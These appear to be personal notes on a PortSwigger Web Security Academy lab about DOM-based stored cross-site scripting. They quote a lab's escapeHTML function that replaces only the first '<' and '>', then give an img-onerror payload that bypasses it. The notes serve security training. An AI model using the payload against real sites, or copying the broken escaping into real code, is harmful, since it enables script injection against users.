```
function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
    }
```

From <https://0a72002203a61604802435c7005700c8.web-security-academy.net/resources/js/loadCommentsWithVulnerableEscapeHtml.js> 

We can escape out of this
```
<><img src=1 onerror=alert(1)>
```

From <https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored> 
